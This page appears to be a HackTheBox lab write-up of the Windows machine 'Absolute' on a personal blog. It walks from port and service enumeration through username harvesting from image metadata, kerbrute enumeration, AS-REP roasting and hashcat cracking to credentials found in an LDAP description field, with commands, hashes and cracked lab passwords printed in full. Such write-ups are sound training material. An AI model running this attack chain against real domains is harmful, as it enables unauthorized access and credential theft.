+</code></pre><pre tabindex=0><code>└─$ nmap -Pn -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -sC -sV 10.10.11.181  --min-rate 10000
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-03 19:36 BST
+Nmap scan report for 10.10.11.181 (10.10.11.181)
+Host is up (0.18s latency).
+
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+80/tcp   open  http          Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Absolute
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-10-04 01:35:57Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: absolute.htb0., Site: Default-First-Site-Name)
+|_ssl-date: 2023-10-04T01:36:48+00:00; +6h59m17s from scanner time.
+| ssl-cert: Subject: commonName=dc.absolute.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc.absolute.htb
+| Not valid before: 2023-07-17T21:11:52
+|_Not valid after:  2024-07-16T21:11:52
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: absolute.htb0., Site: Default-First-Site-Name)
+|_ssl-date: 2023-10-04T01:36:49+00:00; +6h59m17s from scanner time.
+| ssl-cert: Subject: commonName=dc.absolute.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc.absolute.htb
+| Not valid before: 2023-07-17T21:11:52
+|_Not valid after:  2024-07-16T21:11:52
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: absolute.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=dc.absolute.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc.absolute.htb
+| Not valid before: 2023-07-17T21:11:52
+|_Not valid after:  2024-07-16T21:11:52
+|_ssl-date: 2023-10-04T01:36:48+00:00; +6h59m17s from scanner time.
+3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: absolute.htb0., Site: Default-First-Site-Name)
+|_ssl-date: 2023-10-04T01:36:49+00:00; +6h59m17s from scanner time.
+| ssl-cert: Subject: commonName=dc.absolute.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc.absolute.htb
+| Not valid before: 2023-07-17T21:11:52
+|_Not valid after:  2024-07-16T21:11:52
+5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+9389/tcp open  mc-nmf        .NET Message Framing
+Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2023-10-04T01:36:42
+|_  start_date: N/A
+|_clock-skew: mean: 6h59m16s, deviation: 0s, median: 6h59m16s
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 59.79 seconds
+</code></pre><ul><li><code>smb</code></li></ul><pre tabindex=0><code>└─$ smbclient -N -L //10.10.11.181                                                               
+Anonymous login successful
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 10.10.11.181 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available
+</code></pre><ul><li><code>ldap</code></li></ul><pre tabindex=0><code>└─$ ldapsearch -H ldap://dc.absolute.htb -x -s base namingcontexts
+# extended LDIF
+#
+# LDAPv3
+# base &lt;&gt; (default) with scope baseObject
+# filter: (objectclass=*)
+# requesting: namingcontexts 
+#
+
+#
+dn:
+namingcontexts: DC=absolute,DC=htb
+namingcontexts: CN=Configuration,DC=absolute,DC=htb
+namingcontexts: CN=Schema,CN=Configuration,DC=absolute,DC=htb
+namingcontexts: DC=DomainDnsZones,DC=absolute,DC=htb
+namingcontexts: DC=ForestDnsZones,DC=absolute,DC=htb
+
+# search result
+search: 2
+result: 0 Success
+
+# numResponses: 2
+# numEntries: 1
+</code></pre><pre tabindex=0><code>└─$ ldapsearch -H ldap://dc.absolute.htb -x  -b &#34;DC=absolute,DC=htb&#34;  
+# extended LDIF
+#
+# LDAPv3
+# base &lt;DC=absolute,DC=htb&gt; with scope subtree
+# filter: (objectclass=*)
+# requesting: ALL
+#
+
+# search result
+search: 2
+result: 1 Operations error
+text: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this opera
+ tion a successful bind must be completed on the connection., data 0, v4563
+
+# numResponses: 1                     
+</code></pre><ul><li><code>dns</code></li></ul><pre tabindex=0><code>└─$ dig absolute.htb @dc.absolute.htb                                                                                   
+
+; &lt;&lt;&gt;&gt; DiG 9.18.16-1-Debian &lt;&lt;&gt;&gt; absolute.htb @dc.absolute.htb
+;; global options: +cmd
+;; Got answer:
+;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 38236
+;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1
+
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; udp: 4000
+;; QUESTION SECTION:
+;absolute.htb.                  IN      A
+
+;; ANSWER SECTION:
+absolute.htb.           600     IN      A       10.10.11.181
+
+;; Query time: 103 msec
+;; SERVER: 10.10.11.181#53(dc.absolute.htb) (UDP)
+;; WHEN: Wed Oct 04 17:29:51 BST 2023
+;; MSG SIZE  rcvd: 57
+</code></pre><pre tabindex=0><code>└─$ dig axfr absolute.htb @dc.absolute.htb 
+
+; &lt;&lt;&gt;&gt; DiG 9.18.16-1-Debian &lt;&lt;&gt;&gt; axfr absolute.htb @dc.absolute.htb
+;; global options: +cmd
+; Transfer failed.
+</code></pre><ul><li><code>dnsenum</code></li></ul><pre tabindex=0><code>└─$ dnsenum --dnsserver 10.10.11.181 -f /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt absolute.htb
+dnsenum VERSION:1.2.6
+
+-----   absolute.htb   -----                                                                                                                                                                                                                
+
+
+Host&#39;s addresses:                                                                                                                                                                                                                           
+__________________                                                                                                                                                                                                                          
+
+absolute.htb.                            600      IN    A        10.10.11.181                                                                                                                                                               
+
+
+Name Servers:                                                                                                                                                                                                                               
+______________                                                                                                                                                                                                                              
+
+dc.absolute.htb.                         1200     IN    A        10.10.11.181                                                                                                                                                               
+
+
+Mail (MX) Servers:                                                                                                                                                                                                                          
+___________________                                                                                                                                                                                                                         
+
+
+Trying Zone Transfers and getting Bind Versions:                                                                                                                                                                                            
+_________________________________________________                                                                                                                                                                                           
+
+unresolvable name: dc.absolute.htb at /usr/bin/dnsenum line 900.                                                                                                                                                                            
+                                                                                                                                                                                                                                            
+Trying Zone Transfer for absolute.htb on dc.absolute.htb ... 
+AXFR record query failed: no nameservers
+
+
+Brute forcing with /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt:                                                                                                                                                     
+________________________________________________________________________________________                                                                                                                                                    
+  
+dc.absolute.htb.                         1200     IN    A        10.10.11.181                                                                                                                                                               
+domaindnszones.absolute.htb.             600      IN    A        10.10.11.181
+forestdnszones.absolute.htb.             600      IN    A        10.10.11.181
+
+absolute.htb class C netranges:
+________________________________
+
+
+Performing reverse lookup on 0 ip addresses:
+_____________________________________________
+
+0 results out of 0 IP addresses.
+
+absolute.htb ip blocks:
+________________________
+
+done.
+</code></pre><ul><li>Web Server</li></ul><p><img src=./images/1.png alt></p><ul><li><code>gobuster</code></li></ul><pre tabindex=0><code>└─$ gobuster dir -u http://absolute.htb -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -t 50  -x asp,aspx -k
+===============================================================
+Gobuster v3.5
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://absolute.htb
+[+] Method:                  GET
+[+] Threads:                 50
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.5
+[+] Extensions:              asp,aspx
+[+] Timeout:                 10s
+===============================================================
+2023/10/04 18:21:54 Starting gobuster in directory enumeration mode
+===============================================================
+/images               (Status: 301) [Size: 150] [--&gt; http://absolute.htb/images/]
+/css                  (Status: 301) [Size: 147] [--&gt; http://absolute.htb/css/]
+/js                   (Status: 301) [Size: 146] [--&gt; http://absolute.htb/js/]
+/fonts                (Status: 301) [Size: 149] [--&gt; http://absolute.htb/fonts/]
+</code></pre><ul><li><code>feroxbuster</code></li></ul><pre tabindex=0><code>└─$ feroxbuster -u http://absolute.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -k
+
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben &#34;epi&#34; Risher 🤓                 ver: 2.10.0
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://absolute.htb
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
+ 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.10.0
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 🔎  Extract Links         │ true
+ 🏁  HTTP methods          │ [GET]
+ 🔓  Insecure              │ true
+ 🔃  Recursion Depth       │ 4
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+301      GET        2l       10w      150c http://absolute.htb/images =&gt; http://absolute.htb/images/
+301      GET        2l       10w      146c http://absolute.htb/js =&gt; http://absolute.htb/js/
+301      GET        2l       10w      147c http://absolute.htb/css =&gt; http://absolute.htb/css/
+200      GET       33l       64w      782c http://absolute.htb/js/main.js
+200      GET        6l       77w     3351c http://absolute.htb/css/owl.carousel.min.css
+200      GET      145l      442w     4030c http://absolute.htb/css/style.css
+200      GET        5l      369w    21003c http://absolute.htb/js/popper.min.js
+200      GET        7l      277w    44342c http://absolute.htb/js/owl.carousel.min.js
+200      GET     4919l     8218w    79820c http://absolute.htb/fonts/icomoon/style.css
+200      GET        0l        0w    86926c http://absolute.htb/js/jquery-3.3.1.min.js
+200      GET        0l        0w    77906c http://absolute.htb/css/animate.css
+200      GET        0l        0w  5501527c http://absolute.htb/images/hero_6.jpg
+200      GET        0l        0w  1834774c http://absolute.htb/images/hero_5.jpg
+200      GET        0l        0w  2085276c http://absolute.htb/images/hero_4.jpg
+200      GET        0l        0w   160392c http://absolute.htb/css/bootstrap.min.css
+200      GET        0l        0w   374185c http://absolute.htb/images/hero_2.jpg
+200      GET        0l        0w    63240c http://absolute.htb/js/bootstrap.min.js
+200      GET        0l        0w   381437c http://absolute.htb/images/hero_3.jpg
+200      GET        0l        0w   407495c http://absolute.htb/images/hero_1.jpg
+200      GET       85l      196w     2909c http://absolute.htb/
+403      GET       29l       92w     1233c http://absolute.htb/fonts/
+403      GET       29l       92w     1233c http://absolute.htb/fonts/icomoon/
+301      GET        2l       10w      149c http://absolute.htb/fonts =&gt; http://absolute.htb/fonts/
+301      GET        2l       10w      163c http://absolute.htb/fonts/icomoon/fonts =&gt; http://absolute.htb/fonts/icomoon/fonts/
+</code></pre><h2 id=foothold>Foothold</h2><ul><li>I downloaded the <code>hero</code> images<ul><li>Let&rsquo;s run them via <code>exiftool</code> and look for authors</li></ul></li></ul><pre tabindex=0><code>└─$ for i in {1..6}; do (exiftool hero_$i.jpg | grep Author | awk &#39;{print $3 &#34; &#34; $4}&#39;); done
+James Roberts
+Michael Chaffrey
+Donald Klay
+Sarah Osvald
+Jeffer Robinson
+Nicole Smith
+</code></pre><ul><li>Now, we have a list of users<ul><li>Let&rsquo;s generate a user list</li></ul></li></ul><pre tabindex=0><code>└─$ username-anarchy -i usernames &gt; user.list
+</code></pre><pre tabindex=0><code>└─$ head user.list
+james
+jamesroberts
+james.roberts
+jamesrob
+jamerobe
+jamesr
+j.roberts
+jroberts
+rjames
+r.james
+</code></pre><ul><li>Let&rsquo;s find valid users</li></ul><pre tabindex=0><code>└─$ kerbrute userenum --dc dc.absolute.htb -d absolute.htb user.list   
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: v1.0.3 (9dad6e1) - 10/04/23 - Ronnie Flathers @ropnop
+
+2023/10/04 18:47:10 &gt;  Using KDC(s):
+2023/10/04 18:47:10 &gt;   dc.absolute.htb:88
+
+2023/10/04 18:47:10 &gt;  [+] VALID USERNAME:       j.roberts@absolute.htb
+2023/10/04 18:47:10 &gt;  [+] VALID USERNAME:       m.chaffrey@absolute.htb
+2023/10/04 18:47:11 &gt;  [+] VALID USERNAME:       s.osvald@absolute.htb
+2023/10/04 18:47:11 &gt;  [+] VALID USERNAME:       d.klay@absolute.htb
+2023/10/04 18:47:11 &gt;  [+] VALID USERNAME:       j.robinson@absolute.htb
+2023/10/04 18:47:11 &gt;  [+] VALID USERNAME:       n.smith@absolute.htb
+2023/10/04 18:47:12 &gt;  Done! Tested 88 usernames (6 valid) in 1.454 seconds
+</code></pre><ul><li>Let&rsquo;s see if any of valid users is <code>AS-REP</code>-Roastable</li></ul><pre tabindex=0><code>└─$ impacket-GetNPUsers -dc-ip dc.absolute.htb -usersfile user.list absolute.htb/
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[-] User j.roberts doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
+[-] User m.chaffrey doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
+[-] User s.osvald doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
+$krb5asrep$23$d.klay@ABSOLUTE.HTB:496204f8dd4267acdea35229d3482c2d$416205d46cb698bf8c23274bf389333b88833c779b9dccb21a57f67ee21c5433de9a2c5003a187c29cf9288b654bc9f8771439ed11a9dc0b109aa256bdb9321079c91e8650bbe113069a9c5872a735ab7c1f7b6aca81fbb523646dd13d96999acfc814e17a3e6819452e0d9be4f1002a380d172bf2ad4b89218018daeea5112c863742e21e43ff333d70cd58f822126bf95dbcbb08bbfe922a04d74eb6cea046adb1d4a3b54199ae62c48cb76cd0de9626cc3830e229d4fb1fa9a232c80edb402ece738142cc979888523f544b21ec1a0d5e78205866653c167af0da000d2957b17336a23c254e8f7c7413c7
+[-] User j.robinson doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
+[-] User n.smith doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
+</code></pre><ul><li>Let&rsquo;s crack the hash</li></ul><pre tabindex=0><code>└─$ hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt     
+hashcat (v6.2.6) starting
+
+OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+==================================================================================================================================================
+* Device #1: pthread-sandybridge-12th Gen Intel(R) Core(TM) i5-12400, 1436/2936 MB (512 MB allocatable), 2MCU
+...
+$krb5asrep$23$d.klay@ABSOLUTE.HTB:496204f8dd4267acdea35229d3482c2d$416205d46cb698bf8c23274bf389333b88833c779b9dccb21a57f67ee21c5433de9a2c5003a187c29cf9288b654bc9f8771439ed11a9dc0b109aa256bdb9321079c91e8650bbe113069a9c5872a735ab7c1f7b6aca81fbb523646dd13d96999acfc814e17a3e6819452e0d9be4f1002a380d172bf2ad4b89218018daeea5112c863742e21e43ff333d70cd58f822126bf95dbcbb08bbfe922a04d74eb6cea046adb1d4a3b54199ae62c48cb76cd0de9626cc3830e229d4fb1fa9a232c80edb402ece738142cc979888523f544b21ec1a0d5e78205866653c167af0da000d2957b17336a23c254e8f7c7413c7:Darkmoonsky248girl
+...
+</code></pre><ul><li>Let&rsquo;s test the creds<ul><li><code>d.klay:Darkmoonsky248girl</code></li><li><code>STATUS_ACCOUNT_RESTRICTION</code> means we have to use <code>-k</code> for Kerberos auth<ul><li>In case you see <code>KRB_AP_ERR_SKEW</code>, just run <code>sudo ntpdate 10.10.11.181</code>, since kerberos requires time sync</li></ul></li></ul></li></ul><pre tabindex=0><code>└─$ crackmapexec smb absolute.htb -u d.klay -p &#39;Darkmoonsky248girl&#39;           
+SMB         absolute.htb    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
+SMB         absolute.htb    445    DC               [-] absolute.htb\d.klay:Darkmoonsky248girl STATUS_ACCOUNT_RESTRICTION 
+</code></pre><pre tabindex=0><code>└─$ crackmapexec smb absolute.htb -u d.klay -p &#39;Darkmoonsky248girl&#39; -k
+SMB         absolute.htb    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
+SMB         absolute.htb    445    DC               [+] absolute.htb\d.klay:Darkmoonsky248girl
+</code></pre><h2 id=user-1>User #1</h2><ul><li>Let&rsquo;s gather domain information</li></ul><pre tabindex=0><code>└─$ impacket-getTGT absolute.htb/d.klay:&#39;Darkmoonsky248girl&#39; -dc-ip dc.absolute.htb 
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Saving ticket in d.klay.ccache
+</code></pre><pre tabindex=0><code>└─$ KRB5CCNAME=d.klay.ccache bloodhound-python -u d.klay -d absolute.htb -dc dc.absolute.htb -ns 10.10.11.181 -c ALL --zip -k                    
+Password: 
+INFO: Found AD domain: absolute.htb
+INFO: Using TGT from cache
+INFO: Found TGT with correct principal in ccache file.
+INFO: Connecting to LDAP server: dc.absolute.htb
+INFO: Kerberos auth to LDAP failed, trying NTLM
+ERROR: Failure to authenticate with LDAP! Error 8009030C: LdapErr: DSID-0C0906B5, comment: AcceptSecurityContext error, data 52f, v4563
+</code></pre><ul><li>I received an error using <code>bloodhound</code><ul><li>Let&rsquo;s use <code>ldapsearch</code></li><li>But we need a ticket</li></ul></li></ul><pre tabindex=0><code>└─$ cat /etc/krb5.conf 
+[libdefaults]
+        default_realm = ABSOLUTE.HTB
+
+[realms]
+        ABSOLUTE.HTB = {
+                kdc = 10.10.11.181
+        }
+
+[domain_realm]
+        .absolute.htb = ABSOLUTE.HTB
+        absolute.htb = ABSOLUTE.HTB 
+</code></pre><pre tabindex=0><code>└─$ kinit d.klay
+</code></pre><pre tabindex=0><code>└─$ klist
+Ticket cache: FILE:/tmp/krb5cc_1000
+Default principal: d.klay@ABSOLUTE.HTB
+
+Valid starting       Expires              Service principal
+10/05/2023 02:05:40  10/05/2023 06:05:40  krbtgt/ABSOLUTE.HTB@ABSOLUTE.HTB
+        renew until 10/05/2023 06:05:40
+</code></pre><ul><li>Now, we run <code>ldapsearch</code><ul><li>Let&rsquo;s check users</li><li>Make sure that<ul><li><code>/etc/hosts</code> has the following entry <code>10.10.11.181 dc.absolute.htb absolute.htb</code></li><li><code>libsasl2-modules-gssapi-mit</code> is installed</li></ul></li><li>We could also run <code>crackmapexec ldap 10.10.11.181 -u d.klay -p 'Darkmoonsky248girl' -k --users</code></li></ul></li></ul><pre tabindex=0><code>└─$ ldapsearch -H ldap://absolute.htb -Y GSSAPI -b &#34;cn=users,dc=absolute,dc=htb&#34;
+SASL/GSSAPI authentication started
+SASL username: d.klay@ABSOLUTE.HTB
+SASL SSF: 256
+SASL data security layer installed.
+# extended LDIF
+#
+# LDAPv3
+# base &lt;cn=users,dc=absolute,dc=htb&gt; with scope subtree
+...
+dn: CN=svc_smb,CN=Users,DC=absolute,DC=htb
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: user
+cn: svc_smb
+description: AbsoluteSMBService123!
+distinguishedName: CN=svc_smb,CN=Users,DC=absolute,DC=htb
+instanceType: 4
+whenCreated: 20220609082551.0Z
+whenChanged: 20220822163634.0Z
+uSNCreated: 16636
+memberOf: CN=Protected Users,CN=Users,DC=absolute,DC=htb
+uSNChanged: 40999
+name: svc_smb
+...
+# search result
+search: 4
+result: 0 Success
+
+# numResponses: 42
+# numEntries: 41
+</code></pre><ul><li><code>svc_smb</code> looks like has a password in <code>description</code> field<ul><li><code>svc_smb:AbsoluteSMBService123!</code></li><li>The creds are valid</li></ul></li></ul><pre tabindex=0><code>└─$ sudo ntpdate 10.10.11.181; crackmapexec smb 10.10.11.181 -u svc_smb -p &#39;AbsoluteSMBService123!&#39; -k 
+2023-10-05 03:00:19.193039 (+0100) +25157.322135 +/- 0.050155 10.10.11.181 s1 no-leap
+CLOCK: time stepped by 25157.322135
+SMB         10.10.11.181    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.181    445    DC               [+] absolute.htb\svc_smb:AbsoluteSMBService123!
+</code></pre></div><div class="row pl-3 pr-3"><div class="col-md-6 share-buttons"><strong>Share on:</strong>
+<a class="btn btn-sm twitter-btn" href="https://twitter.com/share?url=https%3a%2f%2fumarbaevb.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2fwindows%2fabsolute%2f&text=%5bHTB%5d%20Machine%3a%20Absolute&via=Personal%20Blog" target=_blank><i class="fab fa-twitter"></i></a>
+<a class="btn btn-sm reddit-btn" href="https://reddit.com/submit?url=https%3a%2f%2fumarbaevb.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2fwindows%2fabsolute%2f&title=%5bHTB%5d%20Machine%3a%20Absolute" target=_blank><i class="fab fa-reddit"></i></a>
+<a class="btn btn-sm linkedin-btn" href="https://www.linkedin.com/shareArticle?url=https%3a%2f%2fumarbaevb.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2fwindows%2fabsolute%2f&title=%5bHTB%5d%20Machine%3a%20Absolute" target=_blank><i class="fab fa-linkedin"></i></a>
+<a class="btn btn-sm email-btn" href="mailto:?subject=%5bHTB%5d%20Machine%3a%20Absolute&body=https%3a%2f%2fumarbaevb.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2fwindows%2fabsolute%2f" target=_blank><i class="fas fa-envelope-open-text"></i></a></div><div class="col-md-6 btn-improve-page"><a href=https://github.com/umarbaevB/umarbaevb.github.io/edit/main/content/posts/cybersecurity/hackthebox/machines/windows/absolute/index.md title="Improve this page" target=_blank rel=noopener><i class="fas fa-code-branch"></i>
+Improve this page</a></div></div><hr><div class="row next-prev-navigator"><div class="col-md-6 previous-article"><a href=/posts/cybersecurity/hackthebox/machines/linux/writeup/ title="[HTB] Machine: Writeup" class="btn btn-outline-info"><div><i class="fas fa-chevron-circle-left"></i> Prev</div><div class=next-prev-text>[HTB] Machine: Writeup</div></a></div><div class="col-md-6 next-article"><a href=/posts/cybersecurity/hackthebox/machines/windows/access/ title="[HTB] Machine: Access" class="btn btn-outline-info"><div>Next <i class="fas fa-chevron-circle-right"></i></div><div class=next-prev-text>[HTB] Machine: Access</div></a></div></div><hr></div></div></div><a id=scroll-to-top class=btn><i class="fas fa-chevron-circle-up"></i></a></section><section class=toc-section id=toc-section><div class=toc-holder><h5 class="text-center pl-3">Table of Contents</h5><hr><div class=toc><nav id=TableOfContents><ul><li><a href=#enumeration>Enumeration</a></li><li><a href=#foothold>Foothold</a></li><li><a href=#user-1>User #1</a></li></ul></nav></div></div></section></div><footer id=footer class="container-fluid text-center align-content-center footer pb-2"><div class="container pt-5"><div class="row text-left"><div class="col-md-4 col-sm-12"><h5>Navigation</h5><ul><li class=nav-item><a class=smooth-scroll href=https://umarbaevb.github.io#about>About</a></li><li class=nav-item><a class=smooth-scroll href=https://umarbaevb.github.io#skills>Skills</a></li><li class=nav-item><a class=smooth-scroll href=https://umarbaevb.github.io#education>Education</a></li><li class=nav-item><a class=smooth-scroll href=https://umarbaevb.github.io#projects>Projects</a></li><li class=nav-item><a class=smooth-scroll href=https://umarbaevb.github.io#achievements>Courses and Events</a></li></ul></div><div class="col-md-4 col-sm-12"><h5>Contact me:</h5><ul><li><a href=mailto:hrafnulf13@gmail.com target=_blank rel=noopener><span><i class="fas fa-envelope"></i></span> <span>hrafnulf13@gmail.com</span></a></li><li><a href=https://github.com/umarbaevB target=_blank rel=noopener><span><i class="fab fa-github"></i></span> <span>umarbaevB</span></a></li></ul></div></div></div><hr><div class=container><p id=disclaimer><strong>Liability Notice:</strong> This theme is under MIT license. So, you can use it for non-commercial, commercial, or private uses. You can modify or distribute the theme without requiring any permission from the theme author. However, the theme author does not provide any warranty or takes any liability for any issue with the theme.</p></div><hr><div class=container><div class="row text-left"><div class=col-md-4><a id=theme href=https://github.com/hugo-toha/toha target=_blank rel=noopener><img src=/images/theme-logo_hu8376fd15465fef26ffe66b6bcf0ca686_13669_32x0_resize_box_3.png alt="Toha Theme Logo">
+Toha</a></div><div class="col-md-4 text-center">© 2020 Copyright.</div><div class="col-md-4 text-right"><a id=hugo href=https://gohugo.io/ target=_blank rel=noopener>Powered by
+<img src=/images/hugo-logo.svg alt="Hugo Logo" height=18></a></div></div></div></footer><script src=/application.6ea41b538638987eca0365babdf28c3aa16adbc59643343c39865362e701c943.js integrity="sha256-bqQbU4Y4mH7KA2W6vfKMOqFq28WWQzQ8OYZTYucByUM=" defer></script></body></html>
